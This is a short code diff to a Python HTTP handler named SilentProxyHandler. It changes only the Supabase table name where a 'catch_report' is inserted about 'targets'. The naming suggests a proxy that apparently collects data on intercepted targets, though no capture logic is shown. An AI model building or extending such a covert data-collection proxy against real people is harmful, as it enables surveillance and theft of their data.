@@ -92,7 +92,7 @@ class SilentProxyHandler(BaseHTTPRequestHandler):
             
             if supabase:
                 try:
-                    supabase.table("targets").insert(catch_report).execute()
+                    supabase.table("target").insert(catch_report).execute()
                     print("[+] Data successfully pushed to Supabase database!")
                 except Exception as db_err:
                     print("[-] Supabase push error:", db_err)
